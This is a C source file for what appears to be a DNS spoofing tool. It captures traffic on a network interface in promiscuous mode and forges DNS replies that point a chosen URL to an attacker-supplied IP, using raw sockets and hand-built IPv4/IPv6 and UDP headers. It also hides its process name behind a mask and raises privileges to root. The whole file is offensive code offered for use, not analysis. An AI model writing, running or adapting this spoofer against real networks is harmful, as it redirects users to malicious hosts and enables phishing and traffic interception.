#include "spoof.h"

pid_t pid;
struct options_spoofing opts;

int main(int argc, char *argv[]) {
    char errbuf[PCAP_ERRBUF_SIZE] = {0};
    char* nic_device;
    u_char* args = NULL;
    pcap_t* nic_fd;
    struct bpf_program fp;      // holds compiled program
    bpf_u_int32 netp;           // ip
    bpf_u_int32 maskp;

    check_root_user();
    options_spoofing_init(&opts);
    get_url_address();
    get_ip_address();   // Returning IP address

    program_setup(argc, argv);              // set process name, get root privilege
    nic_device = pcap_lookupdev(errbuf);    // get interface
    pcap_lookupnet(nic_device, &netp, &maskp, errbuf);
    get_device_ip(nic_device);

    // Confirm
    printf("=================================\n");
    printf("   Request URL : %s\n", opts.request_url);
    printf("   Spoofing IP : %s\n", opts.spoofing_ip);
    printf("   My       IP : %s\n", opts.device_ip);
    printf("=================================\n");
    puts("[ DNS Spoofing Initiated ]");

    // open the device for packet capture & set the device in promiscuous mode
    nic_fd = pcap_open_live(nic_device, BUFSIZ, 1, -1, errbuf);
    if (nic_fd == NULL) {
        printf("pcap_open_live(): %s\n", errbuf);
        exit(EXIT_FAILURE);
    }


    signal(SIGINT,sig_handler);

    if (pcap_compile (nic_fd, &fp, FILTER, 0, netp) == -1) {
        fprintf(stderr,"Error calling pcap_compile\n");
        exit(1);
    }

    // Load the filter into the capture device
    if (pcap_setfilter (nic_fd, &fp) == -1) {
        fprintf(stderr,"Error setting filter\n");
        exit(1);
    }
    pcap_loop(nic_fd, (int) opts.count, pkt_callback, args);

    return 0;
}


void options_spoofing_init(struct options_spoofing* option) {
    memset(option, 0, sizeof(struct options_spoofing));
}


void program_setup(int argc, char *argv[]) {
    memset(argv[0], 0, strlen(argv[0]));
    strcpy(argv[0], MASK);
    prctl(PR_SET_NAME, MASK, 0, 0);

    /* Flush caches that has website already visited */
    system(FLUSH_CASH);

    /* change the UID/GID to 0 (raise privilege) */
    setuid(0);
    setgid(0);
}


void get_ip_address(void) {
    uint8_t input_length;

    while (1) {
        printf("Enter response [ IP ] when get DNS request: ");
        fflush(stdout);
        fgets(opts.spoofing_ip, sizeof(opts.spoofing_ip), stdin);
        input_length = (uint8_t) strlen(opts.spoofing_ip);
        if (input_length > 0 && opts.spoofing_ip[input_length - 1] == '\n') {
            opts.spoofing_ip[input_length - 1] = '\0';
            if (is_valid_ipaddress(opts.spoofing_ip) == 0) {
                puts("Invalid IP address");
            }
            else break;
        }
    }
}


void get_url_address(void) {
    uint8_t input_length;
    while (1) {
        puts("\n[ Returning IP ]");
        printf("Enter [ URL ] to request to DNS: ");
        fflush(stdout);
        fgets(opts.request_url, sizeof(opts.request_url), stdin);
        input_length = (uint8_t) strlen(opts.request_url);
        if (input_length > 0 && opts.request_url[input_length - 1] == '\n') {
            opts.request_url[input_length - 1] = '\0';
            break;
        }
    }
}


void get_device_ip(char* nic_device) {
    int n;
    struct ifreq ifr;

    n = socket(AF_INET, SOCK_DGRAM, 0);
    //Type of address to retrieve - IPv4 IP address
    ifr.ifr_addr.sa_family = AF_INET;
    //Copy the interface name in the ifreq structure
    strncpy(ifr.ifr_name, nic_device, IFNAMSIZ - 1);
    ioctl(n, SIOCGIFADDR, &ifr);
    close(n);
    //display result
    strcpy(opts.device_ip, inet_ntoa(((struct sockaddr_in *) &ifr.ifr_addr)->sin_addr));
}


bool is_valid_ipaddress(char *ip_address) {
    struct sockaddr_in sa;
    int result;

    result = inet_pton(AF_INET, ip_address, &(sa.sin_addr));
    return result;
}


void sig_handler(int signum) {
    //Return type of the handler function should be void
    char cmd[64] = {0};
    pid = getpid();
    printf("Ctrl + C pressed\n Exit program \n");
    sprintf(cmd, "sudo kill -9 %d", pid);
    kill(pid,SIGUSR1);

    // extra kill for sometimes not successfully killed
    system(cmd);
}


void create_ipv4_header(char* response_packet, uint16_t size_dns_payload, uint16_t size_response_payload) {
    struct ip *ip_header = (struct ip *) response_packet;
    struct udphdr *udp_header = (struct udphdr *) (response_packet + sizeof (struct ip));

    /* IP header */
    ip_header->ip_hl = 5;
    ip_header->ip_v = 4;
    ip_header->ip_tos = 0;
    ip_header->ip_id = 0;
    ip_header->ip_len = htons(size_response_payload);
    ip_header->ip_off = 0;
    ip_header->ip_ttl = 64;
    ip_header->ip_p = IPPROTO_UDP;
    ip_header->ip_src.s_addr = host_convert(opts.dns_ip);
    ip_header->ip_dst.s_addr = host_convert(opts.device_ip);
    ip_header->ip_sum = calc_ip_checksum(ip_header);

    /* UDP header */
    udp_header->source = htons(53);
    udp_header->dest = htons(opts.device_port);
    udp_header->len = htons(sizeof(struct udphdr) + size_dns_payload);
    udp_header->uh_sum = 0;
}


void create_ipv6_header(char* response_packet, uint16_t size_dns_payload, uint16_t size_response_payload) {
    struct ip6_hdr *ipv6_header = (struct ip6_hdr *) response_packet;
    struct udphdr *udp_header = (struct udphdr *) (response_packet + sizeof (struct ip6_hdr));
    struct in6_addr srcAddr, dstAddr;

    inet_pton(AF_INET6, opts.dns_ipv6, &srcAddr);
    inet_pton(AF_INET6, opts.device_ipv6, &dstAddr);
    /* IP header */
    ipv6_header->ip6_flow = htonl(0x60000000);
    ipv6_header->ip6_plen = htons(size_response_payload);
    ipv6_header->ip6_nxt = IPPROTO_UDP;
    ipv6_header->ip6_hlim = 64;
    ipv6_header->ip6_src = srcAddr;
    ipv6_header->ip6_dst = dstAddr;

    /* UDP header */
    udp_header->source = htons(53);
    udp_header->dest = htons(opts.device_port);
    udp_header->len = htons(sizeof(struct udphdr) + size_dns_payload);
    udp_header->uh_sum = 0;
}


void send_dns_answer(char* response_packet, uint16_t size_response_payload) {
    struct sockaddr_in to_addr;
    int bytes_sent;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int one = 1;

    if (sock < 0) {
        fprintf(stderr, "Error creating socket");
        return;
    }
    to_addr.sin_family = AF_INET;
    to_addr.sin_port = 53;
    to_addr.sin_addr.s_addr = inet_addr(opts.dns_ip);

    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0){
        fprintf(stderr, "Error at setsockopt()");
        return;
    }

    bytes_sent = sendto(sock, response_packet, size_response_payload, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));
    if(bytes_sent < 0)
        fprintf(stderr, "Error sending data");
}


void send_dns_answer2(char* response_packet, uint16_t size_response_payload) {
    struct sockaddr_in6 to_addr;
    ssize_t bytes_sent;
    int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
    int one = 1;

    if (sock < 0) {
        fprintf(stderr, "Error creating socket");
        return;
    }
    to_addr.sin6_family = AF_INET6;
    inet_pton(AF_INET6, opts.dns_ipv6, &(to_addr.sin6_addr));

    if(setsockopt(sock, IPPROTO_IPV6, IP_HDRINCL, &one, sizeof(one)) < 0){
        fprintf(stderr, "Error at setsockopt()");
        return;
    }

    bytes_sent = sendto(sock, response_packet, size_response_payload, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));
    if(bytes_sent < 0)
        fprintf(stderr, "Error sending data");
}
